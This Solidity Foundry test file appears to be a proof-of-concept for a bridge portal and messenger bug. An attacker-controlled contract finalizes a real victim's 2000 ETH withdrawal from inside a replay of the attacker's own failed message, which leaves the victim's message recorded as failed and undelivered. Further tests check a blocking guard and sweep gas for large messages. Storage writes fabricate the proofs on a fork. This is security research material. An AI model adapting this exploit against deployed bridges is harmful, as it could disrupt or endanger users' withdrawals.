// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;
import "./Base.sol";

contract FlipTarget {
    // attacker-controlled relay target: first delivery reverts; on replay it performs a nested portal finalize
    IPortal constant PORTAL = IPortal(0xbEb5Fc579115071764c7423A4f12eDde41f106Ed);
    bool public armed;
    bytes public payload;
    bool public nestedOk;
    function arm(bytes calldata p) external { armed = true; payload = p; }
    fallback() external payable {
        require(armed, "first time fails");
        (bool ok,) = address(PORTAL).call(payload);
        nestedOk = ok;
    }
}
contract Sink { fallback() external payable {} }

contract Fab2Test is Base {
    address game;
    address constant SUB = address(0x5B);
    address constant ATT = address(0xA77ACC);

    function setUp() public {
        _fork();
        Prove memory p = _load(8);
        game = _mature(p.hash, p.submitter);
    }

    function _fab(WithdrawalTransaction memory w) internal returns (bytes32 h) {
        h = hashWd(w);
        bytes32 slot = keccak256(abi.encode(SUB, keccak256(abi.encode(h, uint256(57)))));
        uint256 ts = block.timestamp - 604800 - 10;
        vm.store(address(PORTAL), slot, bytes32((ts << 160) | uint256(uint160(game))));
    }

    function _dec(bytes memory data) internal pure returns (uint256, address, address, uint256, uint256, bytes memory) {
        bytes memory args = new bytes(data.length - 4);
        for (uint256 j = 0; j < args.length; j++) args[j] = data[j + 4];
        return abi.decode(args, (uint256, address, address, uint256, uint256, bytes));
    }

    /// Third party forces a REAL victim messenger withdrawal (idx 36, 2000 ETH, real proof) into the
    /// failed-in-messenger state without delivering it, by finalizing it from inside a replay of the attacker's
    /// own failed message. Attacker's own message M1 uses a FABRICATED proof (it is a message the attacker could
    /// permissionlessly send from L2).
    function test_forced_fail_via_nested_finalize_in_replay() public {
        Prove memory v = _load(36);
        _mature(v.hash, v.submitter);
        FlipTarget t = new FlipTarget();
        uint256 n1 = (uint256(1) << 240) | 0xfffffffff7;
        bytes memory m1 = abi.encodeCall(IMessenger.relayMessage, (n1, ATT, address(t), 0, 2_000_000, hex"aa"));
        WithdrawalTransaction memory w1 = WithdrawalTransaction({ nonce: (uint256(1) << 240) | 0xffffffffff, sender: L2CDM, target: address(L1CDM), value: 0, gasLimit: 2_400_000, data: m1 });
        _fab(w1);
        vm.prank(ATT);
        PORTAL.finalizeWithdrawalTransactionExternalProof(w1, SUB);
        assertTrue(L1CDM.failedMessages(keccak256(m1)));

        t.arm(abi.encodeCall(IPortal.finalizeWithdrawalTransactionExternalProof, (v.wd, v.submitter)));
        uint256 lb = LOCKBOX.balance; uint256 mb = address(L1CDM).balance;
        (,, , , , bytes memory inner) = _dec(v.wd.data);
        inner;
        vm.prank(ATT);
        L1CDM.relayMessage{ gas: 5_000_000 }(n1, ATT, address(t), 0, 2_000_000, hex"aa");
        assertTrue(t.nestedOk());
        bytes32 mh = keccak256(v.wd.data);
        assertTrue(PORTAL.finalizedWithdrawals(v.hash));
        assertTrue(L1CDM.failedMessages(mh));
        assertFalse(L1CDM.successfulMessages(mh));
        assertEq(lb - LOCKBOX.balance, 2000 ether);
        assertEq(address(L1CDM).balance - mb, 2000 ether);
        console.log("victim 2000 ETH now custodied by L1CDM, message failed, not delivered");

        // anyone replays -> delivered exactly once
        (uint256 a, address b, address c, uint256 d, uint256 e, bytes memory f) = _dec(v.wd.data);
        L1CDM.relayMessage(a, b, c, d, e, f);
        assertTrue(L1CDM.successfulMessages(mh));
        assertEq(address(L1CDM).balance, mb);
        vm.expectRevert();
        L1CDM.relayMessage(a, b, c, d, e, f);
    }

    /// Nested finalize from inside a portal-driven relay is blocked by the l2Sender guard.
    function test_nested_finalize_inside_portal_relay_blocked() public {
        Prove memory v = _load(36);
        _mature(v.hash, v.submitter);
        FlipTarget t = new FlipTarget();
        t.arm(abi.encodeCall(IPortal.finalizeWithdrawalTransactionExternalProof, (v.wd, v.submitter)));
        uint256 n1 = (uint256(1) << 240) | 0xfffffffff8;
        bytes memory m1 = abi.encodeCall(IMessenger.relayMessage, (n1, ATT, address(t), 0, 2_000_000, hex"aa"));
        WithdrawalTransaction memory w1 = WithdrawalTransaction({ nonce: (uint256(1) << 240) | 0xfffffffffe, sender: L2CDM, target: address(L1CDM), value: 0, gasLimit: 2_400_000, data: m1 });
        _fab(w1);
        vm.prank(ATT);
        PORTAL.finalizeWithdrawalTransactionExternalProof(w1, SUB);
        assertFalse(t.nestedOk());
        assertFalse(PORTAL.finalizedWithdrawals(v.hash));
    }

    /// Large messages: old L2 baseGas budget (16 gas/byte) vs v9 L1 cost (message now copied to memory before the
    /// gas check). Outcome codes as in GasSweep: 1 NotEnoughGas, 2 L1CDMCallFailed, 4 relayed, 5 failed-recorded.
    function _big(uint256 S) internal {
        address sink = address(new Sink());
        bytes memory message = new bytes(S);
        uint256 n1 = (uint256(1) << 240) | (0xffffffff00 + S % 251);
        bytes memory m1 = abi.encodeCall(IMessenger.relayMessage, (n1, ATT, sink, 0, 0, message));
        uint256 gasLimit = 21000 + 285000 + 16 * (S + 260); // deployed L2CDM v2.2.1 baseGas, minGasLimit 0
        WithdrawalTransaction memory w1 = WithdrawalTransaction({ nonce: (uint256(1) << 240) | 0xfffffffff0, sender: L2CDM, target: address(L1CDM), value: 0, gasLimit: gasLimit, data: m1 });
        bytes32 h = _fab(w1);
        console.log("S / gasLimit", S, gasLimit);
        uint8 last = 255;
        uint256 lo = gasLimit; uint256 hi = gasLimit * 3 + 6_000_000; uint256 step = (hi - lo) / 80;
        for (uint256 g = lo; g <= hi; g += step) {
            uint256 snap = vm.snapshotState();
            vm.prank(ATT);
            (bool ok, bytes memory ret) = address(PORTAL).call{ gas: g }(abi.encodeCall(IPortal.finalizeWithdrawalTransactionExternalProof, (w1, SUB)));
            uint8 c;
            if (!ok) c = ret.length == 0 ? 0 : (bytes4(ret) == bytes4(keccak256("Error(string)")) ? 1 : (bytes4(ret) == bytes4(keccak256("OptimismPortal_L1CDMCallFailed()")) ? 2 : 3));
            else c = L1CDM.successfulMessages(keccak256(m1)) ? 4 : (L1CDM.failedMessages(keccak256(m1)) ? 5 : 6);
            vm.revertToState(snap);
            if (c != last) { console.log("  gas >=", g, "outcome", c); last = c; }
        }
        h;
    }
    function test_big_20k() public { _big(20_000); }
    function test_big_200k() public { _big(200_000); }
    // _big(500_000) measured once: outcome 1 until ~12.83M outer gas, then 4 (no 2/5/6 window); omitted here because the
    // sweep loop exceeds forge's test memory limit.
}
